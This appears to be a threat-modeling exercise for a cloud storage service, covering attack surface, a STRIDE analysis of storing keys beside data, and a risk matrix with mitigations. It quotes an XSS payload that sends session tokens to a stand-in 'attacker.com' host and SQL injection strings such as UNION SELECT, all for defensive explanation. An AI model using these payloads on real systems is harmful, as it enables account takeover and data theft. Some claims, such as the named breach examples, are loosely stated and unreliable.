# Cloud Storage Service Threat Modeling

### System Overview

**Core Features:** Upload/Download | **Sharing:** File sharing with users and public links | **Encryption:** Client-side and server-side options | **Versioning:** Multiple file versions maintained

```
System Architecture:

User Client App
    |
    +--- HTTPS API Gateway ---+
    |                         |
    v                         v
Web UI (React)        Mobile Apps (iOS/Android)
    |
    +--- Authentication Service (OAuth2/JWT)
    |
    +--- File Service API
    |    ├─ Upload endpoint
    |    ├─ Download endpoint
    |    ├─ Delete endpoint
    |    └─ Share endpoint
    |
    +--- Storage Backend
    |    ├─ Object Storage (S3)
    |    └─ Database (metadata, keys, users)
    |
    +--- Encryption Service
    |    ├─ Key management
    |    └─ Encryption/Decryption
    |
    +--- Admin Dashboard
         └─ User management, billing, logs
```

---

## Q1: Attack Surface Mapping

Attack surface includes all points where external actors can interact with the system.

### Complete Attack Surface Inventory

#### Category 1: Authentication and Access Control

| Entry Point | Description | Risk Level |
|-------------|-------------|-----------|
| **Login Endpoint** | POST /api/auth/login (username/password) | MEDIUM | 
| **OAuth Integration** | Third-party auth (Google, GitHub) | MEDIUM |
| **Session Management** | JWT tokens, refresh tokens, cookie handling | MEDIUM-HIGH |
| **MFA System** | TOTP/SMS implementation for two-factor auth | MEDIUM |
| **Password Reset** | POST /api/auth/forgot-password (token generation) | MEDIUM-HIGH |
| **Account Recovery** | Security questions, backup codes | MEDIUM |

#### Category 2: File Upload

| Entry Point | Description | Risk Level |
|-------------|-------------|-----------|
| **Direct Upload** | POST /api/files/upload (multipart form data) | HIGH |
| **Resumable Upload** | Chunked upload for large files | HIGH |
| **Drag-and-Drop Upload** | Browser-based file drop handler | HIGH |
| **Mobile Upload** | iOS/Android file upload APIs | HIGH |
| **Batch Upload** | Multiple files in single request | HIGH |
| **Metadata Injection** | Filename, description, tags in upload | MEDIUM-HIGH |

#### Category 3: File Download and Sharing

| Entry Point | Description | Risk Level |
|-------------|-------------|-----------|
| **Download Endpoint** | GET /api/files/{file_id} | MEDIUM-HIGH |
| **Batch Download** | ZIP multiple files together | MEDIUM-HIGH |
| **Public Share Links** | GET /share/{token} (no auth required) | HIGH |
| **Folder Sharing** | Share entire folder with permissions | MEDIUM-HIGH |
| **Share Token Generation** | POST /api/files/{id}/share | MEDIUM-HIGH |
| **Expiring Links** | Time-limited share tokens | MEDIUM |

#### Category 4: File Management

| Entry Point | Description | Risk Level |
|-------------|-------------|-----------|
| **Delete Endpoint** | DELETE /api/files/{file_id} | MEDIUM |
| **Rename Endpoint** | PATCH /api/files/{id}/rename | LOW-MEDIUM |
| **Move Endpoint** | Move file between folders | MEDIUM |
| **Copy Endpoint** | Duplicate file operation | MEDIUM |
| **File Versioning** | Access previous file versions | MEDIUM |

#### Category 5: Encryption and Key Management

| Entry Point | Description | Risk Level |
|-------------|-------------|-----------|
| **Key Upload (Client-Side)** | User provides encryption key | HIGH |
| **Key Generation** | Service generates encryption key | MEDIUM-HIGH |
| **Key Storage API** | Store/retrieve encryption keys | CRITICAL |
| **Encryption Options** | Switch between client-side/server-side | MEDIUM |
| **Key Rotation** | Rotate old encryption keys | MEDIUM |

#### Category 6: User Collaboration

| Entry Point | Description | Risk Level |
|-------------|-------------|-----------|
| **Add Collaborator** | POST /api/files/{id}/collaborators | MEDIUM |
| **Remove Collaborator** | DELETE /api/files/{id}/collaborators/{user_id} | MEDIUM |
| **Permission Settings** | Read, write, admin permissions | MEDIUM-HIGH |
| **Bulk Sharing** | Share with many users | MEDIUM |
| **Share Notifications** | Email/in-app notifications | LOW |

#### Category 7: Admin and Configuration

| Entry Point | Description | Risk Level |
|-------------|-------------|-----------|
| **Admin Dashboard** | /admin/dashboard (user/billing management) | CRITICAL |
| **User Management** | Create, disable, delete users | CRITICAL |
| **Billing Management** | Payment info, subscription changes | CRITICAL |
| **Audit Logs** | View system activity logs | MEDIUM |
| **System Configuration** | Settings, feature toggles, encryption options | CRITICAL |
| **Backup/Export Data** | Admin backup of user data | CRITICAL |

#### Category 8: API and Integration

| Entry Point | Description | Risk Level |
|-------------|-------------|-----------|
| **REST API Endpoints** | All documented API operations | MEDIUM-HIGH |
| **Webhooks** | Event notifications to external services | MEDIUM |
| **Third-party Integrations** | Office 365, Slack, Google Workspace | MEDIUM |
| **API Keys** | Long-lived keys for automated access | HIGH |
| **OAuth Apps** | Third-party apps accessing user data | MEDIUM-HIGH |

#### Category 9: Web Application Interface

| Entry Point | Description | Risk Level |
|-------------|-------------|-----------|
| **Search Functionality** | GET /api/files/search?q=... | MEDIUM |
| **File Preview** | Render file preview in browser | MEDIUM-HIGH |
| **Image Thumbnail Generation** | Create thumbnails for images | MEDIUM |
| **Document Preview** | PDF/Office preview (requires parsing) | MEDIUM-HIGH |

### Risk Ranking Summary

#### Critical Risk Entries (Immediate Attention)

| Rank | Entry Point | Why Critical |
|------|-------------|------------|
| 1 | Key Storage API | If compromised, all encrypted data becomes readable |
| 2 | Admin Dashboard | Full system control; affects all users |
| 3 | User Management API | Create/delete/modify user accounts |
| 4 | Billing Management | Access to payment methods and subscription data |
| 5 | System Configuration | Disable security features, change encryption settings |

#### High Risk Entries (Significant Threat)

| Rank | Entry Point | Why High Risk |
|------|-------------|------------|
| 1 | File Upload Endpoints | Malware upload, oversized files, malicious content |
| 2 | Public Share Links | No authentication; accessible to anyone with token |
| 3 | Session Management | Session hijacking affects all operations |
| 4 | API Keys | Stolen key = full account access |
| 5 | Permission Management | Incorrect permissions = unauthorized access |

#### Medium Risk Entries (Monitor)

| Rank | Entry Point | Why Medium Risk |
|------|-------------|------------|
| 1 | Authentication | Credential compromise, brute force attacks |
| 2 | File Download | Unauthorized access to others' files |
| 3 | Collaboration APIs | Over-privileged users, permission escalation |
| 4 | File Preview | XXE injection, arbitrary code execution |
| 5 | Search | Information disclosure, enumeration attacks |

### Attack Surface Visualization

```
Public Facing (No Auth Required):
├─ Public Share Links (GET /share/{token})
├─ Login Endpoint (POST /api/auth/login)
└─ Password Reset (POST /api/auth/forgot-password)

Authenticated User APIs:
├─ File Upload (POST /api/files/upload)
├─ File Download (GET /api/files/{id})
├─ File Management (DELETE, PATCH, MOVE)
├─ Sharing (POST /api/files/{id}/share)
├─ Collaboration (POST /api/files/{id}/collaborators)
└─ Account Settings (GET/PATCH /api/user/settings)

Internal/Admin APIs:
├─ Admin Dashboard (GET /admin/dashboard)
├─ User Management (POST/DELETE /admin/users)
├─ Encryption Key API (GET/POST /api/keys)
├─ Audit Logs (GET /admin/logs)
└─ System Configuration (PATCH /admin/config)

Total Attack Surface: 9 categories, 50+ entry points
```

## Q2: Encryption Key Storage in Database - STRIDE Analysis

### The Problem

A developer proposes storing encryption keys in the database alongside encrypted data for convenience: same database, same backup, simpler key management.

This is a critical security flaw.

### Why This Is Problematic

#### Scenario: Security Breach

```
Attacker Gains Database Access (SQL injection, credential compromise, insider threat)

With Current (Secure) Architecture:
├─ Attacker obtains encrypted files
├─ Attacker obtains encrypted data chunks
├─ Attacker CANNOT decrypt without keys
├─ Keys stored separately in key management system
├─ Encrypted data useless without keys
└─ User privacy protected despite breach

With Proposed (Insecure) Architecture:
├─ Attacker obtains encrypted files
├─ Attacker obtains encryption keys from same database
├─ Attacker IMMEDIATELY can decrypt all data
├─ Complete user privacy breach
├─ Attacker reads all confidential files
└─ No protection despite encryption
```

### STRIDE Threats Introduced

#### Threat 1: INFORMATION DISCLOSURE - Complete Data Exposure

| Element | Details |
|---------|---------|
| **STRIDE Category** | INFORMATION DISCLOSURE |
| **Threat** | Attacker obtains encryption keys and decrypts all user files |
| **Attack Scenario** | SQL injection vulnerability: `SELECT * FROM encryption_keys WHERE user_id = 123`; Attacker downloads keys and encrypted data; Uses keys to decrypt files offline |
| **Impact** | Complete privacy breach; attacker reads confidential documents, financial records, medical files, personal photos |
| **Root Cause** | Keys stored in same database as encrypted data |
| **Why It Happens** | "Defense in depth" violated - encryption provides no protection if keys are accessible |
| **Real-World Example** | Facebook, Dropbox, and other services experienced breaches where keys and data were together |
| **Mitigation** | Store keys in separate, highly-restricted key management system (KMS); Never co-locate keys with encrypted data |

#### Threat 2: TAMPERING - Unauthorized Encryption Key Modification

| Element | Details |
|---------|---------|
| **STRIDE Category** | TAMPERING |
| **Threat** | Attacker modifies encryption keys to decrypt user data with altered keys |
| **Attack Scenario** | Attacker gains database write access; Modifies encryption key for user account; Uses modified key to "decrypt" and re-encrypt data with attacker's own key; User can no longer access their own files |
| **Impact** | File corruption; user lockout; data loss; service unavailability for targeted users |
| **Root Cause** | Keys in database have same write protections as any data |
| **Example Attack** | Attacker changes key for VIP user from "abc123def456" to "xyz789"; Original user can no longer decrypt their own files; Attacker with knowledge of modified key can access files |
| **Mitigation** | Keys must be immutable (cryptographic signing); Separate write permissions from data; Key versioning with audit trail |

#### Threat 3: ELEVATION OF PRIVILEGE - Key Access Without Authorization

| Element | Details |
|---------|---------|
| **STRIDE Category** | ELEVATION OF PRIVILEGE |
| **Threat** | Attacker with limited database access escalates to read encryption keys |
| **Attack Scenario** | Attacker has read-only access to file metadata but not encryption keys; Exploit database misconfiguration to read keys table; Access denied error reveals key location; Brute-force or guess key format; Attacker with lower privilege reads keys meant for higher privilege users |
| **Impact** | Cross-user data access; privilege escalation; lateral movement within database |
| **Root Cause** | Keys have same access control as files (should be much more restrictive) |
| **Mitigation** | Encryption keys in separate database with stricter access controls; Hardware security module (HSM) for key storage; Separate credentials for key access; Role-based access control |

#### Threat 4: REPUDIATION - Unable to Audit Key Access

| Element | Details |
|---------|---------|
| **STRIDE Category** | REPUDIATION |
| **Threat** | Attacker accesses encryption keys but leaves no audit trail |
| **Attack Scenario** | Attacker reads encryption keys from database; No audit logging of key access; Administrator cannot determine who accessed keys or when; Attacker denies involvement; No forensic evidence |
| **Impact** | No accountability; unable to investigate breaches; cannot detect compromised keys |
| **Root Cause** | Key access not logged; stored same as regular data |
| **Mitigation** | Comprehensive audit logging of ALL key access; Immutable logs in separate system; Monitor access patterns for anomalies; Alert on unauthorized key access |

#### Threat 5: TAMPERING - Backup Exposure

| Element | Details |
|---------|---------|
| **STRIDE Category** | TAMPERING / INFORMATION DISCLOSURE |
| **Threat** | Attacker accesses database backups containing both encrypted data and keys |
| **Attack Scenario** | Attacker steals database backup file; Backup contains both encrypted files AND keys; Attacker extracts keys from backup; Decrypts all files; Keys were meant to be long-term secret but backup is permanent record |
| **Impact** | Historical data breach; attacker can decrypt files from months/years ago |
| **Root Cause** | Keys included in regular backups |
| **Mitigation** | Never include keys in database backups; Store backup encryption keys separately; Use key derivation instead of storing keys; Rotate keys and re-encrypt old backups |

### Correct Architecture for Encryption Keys

```
SECURE ARCHITECTURE:

User Data Storage (Database)
├─ User files (encrypted)
├─ File metadata
├─ User profiles
└─ NO ENCRYPTION KEYS

Key Management System (Separate, Highly Protected)
├─ Encryption keys
├─ Key versioning
├─ Key rotation
├─ Access audit logs
├─ Hardware Security Module backing
└─ Separate credentials required

Data Flow:
1. User uploads file
2. Application requests encryption key from KMS
3. KMS verifies user authorization
4. KMS returns key (in memory only, never logged)
5. Application encrypts file with key
6. Encrypted file stored in database
7. Key immediately discarded from memory
8. KMS never stores key in accessible form

Breach Scenario (Secure):
├─ Attacker compromises database
├─ Attacker obtains encrypted files
├─ Attacker CANNOT access KMS (separate system)
├─ Attacker CANNOT decrypt files without keys
├─ Damage contained to metadata only
└─ User files remain confidential
```

## Q3: Risk Matrix for Top 5 Threats

### Methodology

Risk Score = Likelihood (1-5) × Impact (1-5)

Where:
- **Likelihood:** How easily can threat be exploited? (1=very difficult, 5=trivial)
- **Impact:** How much damage if exploited? (1=minor, 5=catastrophic)
- **Risk Level:** Critical (20-25), High (15-19), Medium (10-14), Low (5-9)

### Top 5 Threats Identified

### Threat 1: Unauthorized File Access via SQL Injection

| Factor | Score | Justification |
|--------|-------|---------------|
| **Vulnerability** | File download endpoint uses unsanitized user input in query |
| **Attack Example** | GET /api/files/download?id=123 OR 1=1; Attacker downloads all files |
| **Likelihood** | 4/5 | SQL injection common in web apps; endpoint obvious; easy to test |
| **Impact** | 5/5 | Attacker accesses all user files; complete data breach; privacy violation |
| **Risk Score** | 4 × 5 = **20/25** | **CRITICAL** |

#### Breakdown

```
Attack Chain:
1. Attacker identifies download endpoint: GET /api/files/{file_id}
2. Attacker tests for SQL injection: /api/files/999 OR 1=1 LIMIT 10
3. Server returns multiple files instead of one
4. Attacker crafts: /api/files/999 UNION SELECT id, name, data FROM files
5. Attacker retrieves all files from database
6. Attacker downloads complete database dump

Why Likely:
- SQL injection is #1 web vulnerability
- File IDs often numeric (easy to inject)
- Developers may skip input validation in "internal" endpoints
- Automated scanning tools detect this vulnerability

Why High Impact:
- Access to ALL user files across service
- Files may contain: confidential documents, medical records, financial data
- Violates GDPR, HIPAA, PCI-DSS
- Complete user privacy breach
- Regulatory fines up to millions
```

#### Mitigation

```
Prevent SQL Injection:
├─ Use parameterized queries (prepared statements)
├─ Never concatenate user input into SQL
├─ Validate file_id is numeric: /^\d+$/
├─ Whitelist allowed characters
├─ Use ORM frameworks (Sequelize, SQLAlchemy)

Server-side Authorization:
├─ Check: user owns file before returning
├─ Check: file_id exists in user's folder
├─ Verify: user has read permission
└─ Deny any file outside user's scope
```

### Threat 2: Session Hijacking via Token Theft

| Factor | Score | Justification |
|--------|-------|---------------|
| **Vulnerability** | JWT tokens stored in localStorage (vulnerable to XSS) |
| **Attack Example** | XSS injects script to steal token; Attacker uses token to access user account |
| **Likelihood** | 4/5 | XSS common; localStorage easy to steal; tokens not refreshed frequently |
| **Impact** | 5/5 | Full account access; attacker acts as user; can upload, download, delete files |
| **Risk Score** | 4 × 5 = **20/25** | **CRITICAL** |

#### Breakdown

```
Attack Chain:
1. Attacker finds XSS vulnerability in file comment field
2. Attacker posts comment: <script>fetch('//attacker.com/steal?token='+localStorage.getItem('token'))</script>
3. Other users view comment; JavaScript executes in browser
4. Token sent to attacker's server
5. Attacker uses stolen token in API request: Authorization: Bearer {stolen_token}
6. Server accepts token; attacker is logged in as victim
7. Attacker downloads user's confidential files
8. Attacker uploads malware, shares files publicly
9. Attacker changes password; victim locked out

Why Likely:
- XSS vulnerabilities common (OWASP Top 10)
- localStorage accessible from JavaScript
- Tokens have long expiration (hours/days)
- No token binding to IP/user agent
- Users don't know they're compromised

Why High Impact:
- Full account takeover
- Can modify/delete user files
- Can change account settings
- Can access shared files
- Can impersonate user in collaboration
```

#### Mitigation

```
Secure Token Storage:
├─ Use httpOnly cookies (not localStorage)
├─ httpOnly prevents JavaScript access
├─ SameSite=Strict prevents CSRF
├─ Secure flag forces HTTPS only
└─ Set expiration: 15 minutes (refresh token: 7 days)

XSS Prevention:
├─ Input sanitization: remove <script>, <iframe> tags
├─ Output encoding: encode user input as text
├─ Content Security Policy (CSP) header
├─ Validate all user inputs server-side

Session Security:
├─ Bind token to IP address; token invalid if IP changes
├─ Bind token to user-agent; revoke if changes
├─ Implement token rotation: new token on each request
├─ Revoke compromised tokens immediately
└─ Log all session activity; alert on unusual access
```

### Threat 3: Privilege Escalation via Permission Bypass

| Factor | Score | Justification |
|--------|-------|---------------|
| **Vulnerability** | Sharing permissions checked client-side; server trust client input |
| **Attack Example** | Attacker modifies API request to change own permission level to admin |
| **Likelihood** | 4/5 | Common developer error; easy to test with Burp Suite; permission models often flawed |
| **Impact** | 5/5 | Attacker gains admin access; controls entire system; affects all users |
| **Risk Score** | 4 × 5 = **20/25** | **CRITICAL** |

#### Breakdown

```
Attack Chain:
1. Attacker is regular user with limited permissions
2. Attacker intercepts API request: POST /api/files/123/share
3. Original request: {"user_id": 456, "permission": "read"}
4. Attacker modifies request: {"user_id": 456, "permission": "admin"}
5. Server accepts request; attacker is now admin
6. Attacker accesses /admin/dashboard
7. Attacker downloads all user files
8. Attacker reads audit logs
9. Attacker disables encryption, downloads plaintext data

Why Likely:
- Permission checks often missing server-side
- Developers assume client sends honest requests
- Permission levels encoded in requests (easy to modify)
- No signature/validation of permission changes
- API permission logic complex; often flawed

Why High Impact:
- Access to ALL user data
- Can modify system configuration
- Can disable security features
- Can access audit logs
- Can create backdoor accounts
- Can export entire user database
```

#### Mitigation

```
Server-Side Authorization:
├─ NEVER trust permission levels from client
├─ Validate permissions server-side for EVERY request
├─ Check: does user have permission to modify target resource?
├─ Check: does user have permission to grant permissions?
├─ Deny by default; only allow explicitly granted permissions

Permission Validation:
├─ Validate permission against database
├─ Check user role: reader, editor, admin
├─ Check resource ownership: user owns file/folder
├─ Check folder hierarchy: user can only share own files
└─ Log all permission changes with audit trail

Code Example:
  function shareFile(fileId, targetUserId, permission):
    # Never trust client-provided permission
    # Always fetch from database
    user = getCurrentUser()
    file = getFileFromDB(fileId)
    
    # Verify ownership
    if file.owner_id != user.id:
      return ERROR("Not owner, cannot share")
    
    # Validate permission value
    if permission NOT IN ["read", "edit", "admin"]:
      return ERROR("Invalid permission")
    
    # Check user cannot grant higher permissions than they have
    userPermission = getUserFilePermission(user, file)
    if permission > userPermission:
      return ERROR("Cannot grant permission higher than own")
    
    # Only then grant permission
    grantPermission(targetUserId, fileId, permission)
    logAudit("Permission grant", file, targetUserId, permission)
```

### Threat 4: Public Share Link Enumeration

| Factor | Score | Justification |
|--------|-------|---------------|
| **Vulnerability** | Share tokens are sequential or predictable; no rate limiting |
| **Attack Example** | Attacker generates sequential share token IDs; guesses valid tokens |
| **Likelihood** | 3/5 | Requires token prediction capability; depends on token generation algorithm |
| **Impact** | 5/5 | Attacker accesses private files meant only for specific users |
| **Risk Score** | 3 × 5 = **15/25** | **HIGH** |

#### Breakdown

```
Attack Scenario:

Weak Token Generation:
├─ Share token: "share_12345" (sequential numbering)
├─ Attacker guesses: share_12346, share_12344, share_12347
├─ Many guesses succeed; attacker finds valid share tokens
├─ Attacker accesses files meant to be private

Impact:
├─ Private files exposed to attacker
├─ Confidential business documents accessed
├─ Personal files accessed without consent
├─ Breach of privacy expectations
└─ User unaware of unauthorized access

Why Likely (3/5):
├─ Some developers use sequential tokens
├─ UUID v1 can be predicted (includes timestamp)
├─ Rate limiting often missing on share endpoints
├─ No verification of token ownership
└─ Difficult to detect enumeration attacks

Why High Impact (5/5):
├─ Shares are intended to be semi-private
├─ User assumes only intended recipients access
├─ Attacker reads confidential files
├─ User unaware of breach
└─ Scale: attacker can enumerate thousands of tokens
```

#### Mitigation

```
Secure Token Generation:
├─ Use cryptographically random tokens (random.SystemRandom, secrets.token_urlsafe)
├─ Token length: minimum 32 characters (256 bits entropy)
├─ Do NOT use: sequential IDs, UUIDs v1, timestamps
├─ Example: share_aBcDeF1234_xYz9876_AbCdEf
└─ Validate token format: [a-zA-Z0-9_-]{32,}

Rate Limiting:
├─ Limit share token validation attempts: 5 per minute per IP
├─ After 10 failed attempts: block IP for 1 hour
├─ Log all failed share token access attempts
├─ Alert on mass enumeration attempts
└─ Return generic error (don't reveal if token exists)

Token Management:
├─ Store token hash in database (not plaintext)
├─ Token expiration: owner-configured (1 day to 1 year)
├─ Token single-use option: valid only for download, not view
├─ Track share token usage: who downloaded, when, from where
├─ Revoke share links immediately when file deleted
└─ Notify owner on unauthorized access attempts
```

### Threat 5: Man-in-the-Middle Attack - Intercepted File Download

| Factor | Score | Justification |
|--------|-------|---------------|
| **Vulnerability** | File downloads not encrypted; user connects to untrusted Wi-Fi |
| **Attack Example** | User downloads file on airport Wi-Fi; attacker intercepts and modifies file |
| **Likelihood** | 3/5 | Requires network access; only works if HTTP used; mobile users more vulnerable |
| **Impact** | 4/5 | Attacker modifies file contents; user receives malicious version; malware infection |
| **Risk Score** | 3 × 4 = **12/25** | **HIGH** |

#### Breakdown

```
Attack Scenario:

User at Airport Wi-Fi:
├─ Connects to "AirportWiFi" (attacker's fake network)
├─ Downloads important document via HTTP (not HTTPS)
├─ Attacker intercepts HTTP request
├─ Attacker replaces document with modified version (malware, incorrect data)
├─ User receives malicious file without knowing
├─ User opens document; malware installs
├─ Attacker gains access to user's computer

Why Likely (3/5):
├─ Public Wi-Fi networks unencrypted
├─ MITM attacks easy on unencrypted networks
├─ Some users disable HTTPS warnings
├─ Mobile apps may not validate certificates properly
├─ Users unaware of network security risks

Why High Impact (4/5):
├─ Downloaded files can contain malware
├─ User trusts file came from cloud service
├─ Malware installation on user's computer
├─ Attacker gains access to user's files, credentials, emails
├─ Lateral movement to corporate network
└─ Impact to both individual and organization
```

#### Mitigation

```
Enforce HTTPS/TLS:
├─ Require HTTPS for all file downloads
├─ Use TLS 1.2+ (reject older versions)
├─ Use strong cipher suites
├─ HSTS header: enforce HTTPS for 1 year
├─ Certificate pinning in mobile apps
└─ Reject self-signed certificates

Verify File Integrity:
├─ Send file hash (SHA-256) over HTTPS
├─ Client verifies hash after download
├─ Hash mismatch = alert user, reject file
├─ Example: Content-SHA256 header
└─ Prevents modified files

Additional Security:
├─ Encrypt files at rest (AES-256)
├─ Encrypt in-transit (TLS)
├─ Sign downloads with digital signature
├─ Implement certificate transparency
└─ Monitor for SSL/TLS downgrade attacks

Implementation:
  // HTTPS header enforcing security
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  
  // Send file with hash
  Content-SHA256: abc123def456...
  
  // Mobile app pinning
  if (certificate.publicKey != pinnedKey):
    reject_connection()
```
